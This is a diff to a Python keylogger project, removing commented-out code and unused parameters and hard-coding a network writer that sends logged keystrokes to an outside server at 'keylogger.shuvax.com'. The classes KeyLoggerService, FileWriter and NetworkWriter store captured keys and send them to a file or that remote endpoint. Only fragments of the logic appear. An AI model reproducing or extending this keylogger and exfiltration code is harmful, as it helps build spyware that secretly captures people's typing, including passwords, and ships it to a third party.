@@ -1,4 +1,4 @@
-import requests,time,ToolBox,pygetwindow,json,random,string,os,base64
+import requests,time,ToolBox,pygetwindow,json,os,base64
 from Interface import IKeyLogger,Write
 class KeyLoggerService(IKeyLogger):
     def __init__(self):
@@ -25,17 +25,13 @@ class KeyLoggerService(IKeyLogger):
         self.__logged_keys[self.__last_record] += key
 
     def get_logged_keys(self) -> dict[str:str]:
-        # if len(self.__logged_keys)<1:
-        #     return {}
-        # return {key:value for key, value in self.__logged_keys.items() if key is not self.__last_record}
         return self.__logged_keys
 
     def clear_logged_keys(self) -> dict[str:str]:
-        # self.__logged_keys = {self.__last_record:self.__logged_keys[self.__last_record]} if self.__last_record in self.__logged_keys else {}
         self.__logged_keys = {}
 
 class FileWriter(Write):
-    def __init__(self,path=None):
+    def __init__(self):
         self.path = ToolBox.get_file_path()
 
     def write(self, sn, data: dict[str, str]) -> bool:
@@ -59,8 +55,8 @@ class FileWriter(Write):
             return False
 
 class NetworkWriter(Write):
-    def __init__(self,url=None):
-        self.url = url or "https://keylogger.shuvax.com"
+    def __init__(self):
+        self.url =  "https://keylogger.shuvax.com"
     def write(self, serial_number, data:dict[str:str]) -> bool:
         if not data:
             return True
